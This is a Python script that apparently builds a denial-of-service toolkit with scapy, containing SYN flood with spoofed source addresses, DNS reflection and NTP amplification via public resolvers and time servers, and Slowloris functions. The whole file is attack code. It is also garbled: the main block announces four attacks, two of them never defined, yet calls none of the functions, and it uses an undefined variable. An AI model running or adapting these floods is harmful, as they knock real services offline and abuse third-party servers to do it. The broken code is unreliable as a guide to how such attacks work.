#!/bin/python
from scapy.all import *
import random
import time

# Configuration
target_ip = "192.168.1.100"
target_port = 80
dns_server = "8.8.8.8"
ntp_server = "pool.ntp.org"
attack_duration = 60  # Attack duration in seconds

# Function to generate a random source IP
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# SYN Flood attack
def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        time.sleep(random.uniform(0.001, 0.01))

# DNS Reflection attack
def dns_reflection(target_ip, dns_server, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        src_ip = target_ip
        ip_layer = IP(src=src_ip, dst=dns_server)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
        dns_layer = DNS(rd=1, qd=DNSQR(qname="example.com"))
        packet = ip_layer / udp_layer / dns_layer
        send(packet, verbose=False)
        time.sleep(random.uniform(0.01, 0.1))

# NTP Amplification attack
def ntp_amplification(target_ip, ntp_server, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        src_ip = target_ip
        ip_layer = IP(src=src_ip, dst=ntp_server)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=123)
        ntp_layer = NTPHeader()
        packet = ip_layer / udp_layer / ntp_layer
        send(packet, verbose=False)
        time.sleep(random.uniform(0.01, 0.1))

# Slowloris attack
def slowloris(target_ip, target_port, duration):
    end_time = time.time() + duration
    sockets = []
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)))
            s.send("User-Agent: {}\r\n".format(random.choice(user_agents)))
            s.send("Accept-language: en-US,en,q=0.5\r\n")
            sockets.append(s)
            time.sleep(random.uniform(0.01, 0.1))
        except socket.error:
            break

if __name__ == "__main__":
    print("Starting SYN Flood attack on {}:{}".format(target_ip, target_port))
    
    

    print("Starting CPU and Memory Exhaustion attack on {}:{}".format(target_ip, target_port))
    
    

    print("Starting Bandwidth Exhaustion attack on {}:{}".format(target_ip, target_port))
    
    

    print("Starting Slowloris attack on {}:{}".format(target_ip, target_port))
    
    
